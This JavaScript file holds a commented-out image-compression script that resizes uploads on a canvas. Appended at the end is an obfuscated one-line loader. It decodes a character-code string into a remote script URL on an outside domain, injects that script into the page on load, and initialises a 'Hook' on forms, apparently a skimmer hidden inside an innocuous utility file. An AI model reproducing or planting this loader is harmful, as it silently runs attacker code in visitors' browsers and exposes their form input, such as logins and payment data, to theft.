// const IMAGE_QUALITY = 0.5;

// function compressImage(image, scale, initalWidth, initalHeight){
//     return new Promise((resolve, reject) => {

//         const canvas = document.createElement("canvas");

//         canvas.width = scale * initalWidth;
//         canvas.height = scale * initalHeight;

//         const ctx = canvas.getContext("2d");
//         ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
        
//         ctx.canvas.toBlob((blob) => {
//             resolve(blob);
//         }, "image/png", IMAGE_QUALITY); 
//     }); 
// }

// function getImageDimensions(image){
//     return new Promise((resolve, reject) => {
//         image.onload = function(e){
//             const width = this.width;
//             const height = this.height;
//             resolve({height, width});
//         }
//     });
// }

// const imageInput = document.getElementById("image-input");
// imageInput.addEventListener("change", async (ev) => {

//     const uploadedImage = imageInput.files[0];
//     if(!uploadedImage){ // if no file is uploaded, no need to do anything
//         return;
//     }

//     //preview the inputted image
//     const inputPreview = document.getElementById("input-preview"); 
//     inputPreview.src = URL.createObjectURL(uploadedImage);
    
//     //get the dimensions of the input image
//     const {height, width} = await getImageDimensions(inputPreview); 

//     const MAX_WIDTH = 200; //if we resize by width, this is the max width of compressed image
//     const MAX_HEIGHT = 200; //if we resize by height, this is the max height of the compressed image

//     const widthRatioBlob = await compressImage(inputPreview, MAX_WIDTH / width, width, height); 
//     const heightRatioBlob = await compressImage(inputPreview, MAX_HEIGHT / height, width, height);
 
//     //pick the smaller blob between both
//     const compressedBlob = widthRatioBlob.size > heightRatioBlob.size ? heightRatioBlob : widthRatioBlob;
    
//     // preview the compressed blob
//     const outputPreview = document.getElementById("output-preview");
//     outputPreview.src = URL.createObjectURL(compressedBlob);

//     /*in some cases, the initial uploaded image maybe smaller than our compressed result. 
//       if that is the case, reuse the uploaded image. */
  
//     const optimalBlob = compressedBlob.size < uploadedImage.size ? compressedBlob : uploadedImage; 
//     console.log(`Inital Size: ${uploadedImage.size}. Compressed Size: ${optimalBlob.size}`);
    
//     URL.revokeObjectURL(inputPreview);
//     URL.revokeObjectURL(outputPreview);
// });
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b